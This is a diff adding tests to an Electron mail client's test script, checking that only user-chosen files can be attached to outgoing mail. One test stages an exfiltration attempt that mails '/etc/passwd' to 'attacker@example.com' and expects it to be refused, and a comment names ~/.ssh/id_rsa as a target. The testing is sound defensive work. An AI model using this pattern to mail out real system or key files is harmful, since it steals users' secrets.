@@ -8,7 +8,7 @@
 // GreenMail's plain IMAP port does not advertise STARTTLS, which makes it an
 // accurate stand-in for the downgrade case the TLS check cares about.
 import { app } from 'electron'
-import { mkdtempSync, rmSync } from 'fs'
+import { mkdtempSync, rmSync, writeFileSync, unlinkSync } from 'fs'
 import { tmpdir } from 'os'
 import { join } from 'path'
 import { execFileSync } from 'child_process'
@@ -1216,6 +1216,78 @@ async function main(): Promise<void> {
     const packagedWmClass = pkg.build?.linux?.desktop?.entry?.StartupWMClass
     ok('the packaged entry’s StartupWMClass matches the app name',
       packagedWmClass === appName, `${packagedWmClass} vs ${appName}`)
+  }
+
+  // -------------------------------------------------------------------------
+  section('Attachments: only files the user chose can be attached')
+  // -------------------------------------------------------------------------
+  {
+    // compose:send handed the renderer's attachmentPaths straight to
+    // readFileSync. The renderer is the process that renders untrusted email
+    // HTML, so anything that gained script execution there could attach
+    // ~/.ssh/id_rsa or the mail database and mail it out. Approval now comes
+    // from the OS dialog, a genuine drag-and-drop (resolved by webUtils, which
+    // gives nothing for a File the renderer builds), or a path main wrote.
+    const allow = await import('../electron/services/attachment-allowlist')
+    const smtp = await import('../electron/services/smtp-send')
+
+    allow.clearApprovedAttachments()
+    ok('nothing is attachable to begin with', allow.approvedAttachmentCount() === 0)
+
+    const chosen = join(tmpdir(), 'orbit-approved-attachment.txt')
+    writeFileSync(chosen, 'a file the user picked')
+    allow.approveAttachmentPath(chosen)
+    ok('a chosen file is approved', allow.isAttachmentApproved(chosen))
+    ok('an unchosen file is not', !allow.isAttachmentApproved('/etc/passwd'))
+
+    // Path spelling must not decide it.
+    const dotted = join(tmpdir(), '.', 'orbit-approved-attachment.txt')
+    ok('an equivalent path spelling is still approved', allow.isAttachmentApproved(dotted), dotted)
+
+    ok('approved paths pass the assert',
+      (() => {
+        try {
+          allow.assertAttachmentsApproved([chosen])
+          return true
+        } catch {
+          return false
+        }
+      })())
+
+    let refusal: Error | null = null
+    try {
+      allow.assertAttachmentsApproved([chosen, '/etc/passwd'])
+    } catch (err) {
+      refusal = err as Error
+    }
+    ok('one unapproved path in the list refuses the lot', !!refusal, refusal?.message)
+    ok('the refusal names the offending file',
+      !!refusal && refusal.message.includes('/etc/passwd'), refusal?.message)
+
+    // End to end: a send naming a file the user never chose must do nothing —
+    // not even resolve credentials or open a transport.
+    const exfil = await rejects(() =>
+      smtp.sendMail(
+        {
+          accountId: account.id,
+          to: 'attacker@example.com',
+          subject: 'exfil',
+          bodyHtml: '',
+          bodyText: '',
+          attachmentPaths: ['/etc/passwd']
+        } as never,
+        'imap'
+      )
+    )
+    ok('a send with an unapproved attachment is refused', !!exfil, exfil?.message)
+    ok('and it is refused for that reason, not by chance',
+      !!exfil && /not chosen in this compose window/.test(exfil.message), exfil?.message)
+
+    // Clearing happens when a compose window closes.
+    allow.clearApprovedAttachments()
+    ok('closing compose withdraws approval', !allow.isAttachmentApproved(chosen))
+
+    unlinkSync(chosen)
   }
 
   // -------------------------------------------------------------------------
